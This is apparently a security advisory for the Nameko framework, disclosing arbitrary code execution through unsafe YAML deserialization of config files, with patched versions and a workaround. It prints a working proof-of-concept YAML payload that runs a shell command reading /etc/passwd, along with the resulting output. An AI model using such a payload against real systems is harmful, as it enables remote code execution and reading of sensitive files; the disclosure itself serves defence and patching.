summary: "Nameko Arbitrary code execution due to YAML deserialization\n### Impact\n\nNameko\
  \ can be tricked to perform arbitrary code execution when deserialising a YAML config file.\
  \ Example:\n\n``` yaml\n# malicious.yaml\n!!python/object/new:type\nargs: ['z', !!python/tuple\
  \ [], {'extend': !!python/name:exec }]\nlistitems: \"__import__('os').system('cat /etc/passwd')\"\
  \n```\n\n``` shell\n$ nameko run --config malicious.yaml test\nroot:x:0:0:root:/root:/bin/bash\n\
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n\
  sync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\n... \n\
  ```\n\n### Patches\n\nThe problem was fixed in https://github.com/nameko/nameko/pull/722 and\
  \ released in version 2.14.0, and in rc10 of the v3 pre-release.\n\nVersions prior to 2.14.0,\
  \ and v3.0.0rc0 through v3.0.0rc9 are still vulnerable.\n\n### Workarounds\n\nThe vulnerability\
  \ is exploited by config files with malicious content. It can be avoided by only using config\
  \ files that you trust."
